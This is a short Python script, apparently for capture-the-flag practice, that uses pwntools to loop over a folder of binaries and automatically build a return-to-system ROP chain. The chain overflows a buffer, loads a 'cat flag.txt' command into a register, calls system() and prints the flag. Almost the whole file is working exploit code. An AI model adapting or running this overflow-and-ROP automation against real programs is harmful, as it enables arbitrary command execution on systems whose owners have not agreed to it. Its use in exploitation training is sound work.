import os, sys
from pwn import *
from fart import *
from time import sleep
logging.getLogger('pwnlib').setLevel(logging.WARNING)

def main():
    path = 'bins3/'
    for binary in os.listdir(path):
        binary = path + binary 
        print(binary+":")
        
        f_anal = analyze(binary)
        f_rop = our_rop(f_anal)

        if f_anal.has_system():
            ret2system(f_anal)

def ret2system(f_anal):
    binary = f_anal.binary
    get_buf = get2overflow(binary)
    get_rop = our_rop(f_anal)

    e = ELF(binary)
    r = ROP(e)

    buf = b'A' * get_buf.buf()
    chain = b''
    
    chain += get_rop.fill_reg('rdi', f_anal.get_catflagtxt())
    chain += get_rop.fill_reg('rsi', 0)
    
    chain += p64(e.sym['system'])



    io = process(binary)
    io.sendline(buf + chain)
    io.recvuntil(b'flag')
    print("flag" + io.recvuntil(b'}').decode('utf-8'))


main()
